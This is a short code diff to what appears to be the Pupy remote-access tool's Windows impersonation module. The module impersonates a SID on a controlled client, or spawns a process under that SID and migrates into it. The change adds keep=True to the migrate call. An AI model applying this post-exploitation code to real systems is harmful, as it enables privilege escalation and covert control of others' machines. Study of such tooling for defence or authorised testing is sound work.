@@ -27,7 +27,7 @@ class ImpersonateModule(PupyModule):
         elif args.impersonate:
             if args.migrate:
                 proc_pid=self.client.conn.modules["pupwinutils.security"].create_proc_as_sid(args.impersonate)
-                migrate(self, proc_pid)
+                migrate(self, proc_pid, keep=True)
             else:
                 self.client.impersonated_dupHandle=self.client.conn.modules["pupwinutils.security"].impersonate_sid_long_handle(args.impersonate, close=False)
             self.success("Sid %s impersonated !"%args.impersonate)
